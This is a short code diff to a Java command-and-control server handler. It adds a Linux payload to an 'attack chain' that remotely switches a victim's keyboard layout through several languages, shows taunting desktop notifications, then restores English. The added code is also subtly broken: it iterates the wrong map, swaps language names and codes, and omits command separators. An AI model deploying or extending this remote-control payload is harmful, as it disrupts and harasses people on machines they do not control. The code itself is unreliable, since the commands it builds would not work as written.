@@ -429,7 +429,20 @@ public class C2ServerUserHandler implements Runnable{
                     windowsCommands += "Set-WinUserLanguageList en-US -force;";
 
                     // Linux
+                    HashMap<String, String> languagesLin = new HashMap<>();
                     linuxCommands = "";
+                    languagesLin.put("French", "fr");
+                    languagesLin.put("German", "de");
+                    languagesLin.put("Arabic", "ar");
+                    languagesLin.put("Cantonese", "zh");
+                    languagesLin.put("Italian","it");
+                    for(String language : languages.keySet()){
+                        linuxCommands += "setxkbmap " + language + ";";
+                        linuxCommands += "notify-send 'Have Fun Learning " + languagesLin.get(language) + " MF'";
+                        linuxCommands += "sleep 60;";
+                    }
+                    linuxCommands += "notify-send 'Ok you can have English Again'";
+                    linuxCommands += "setxkbmap en;";
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("4")){
                     // Change it back to english in case we mess up
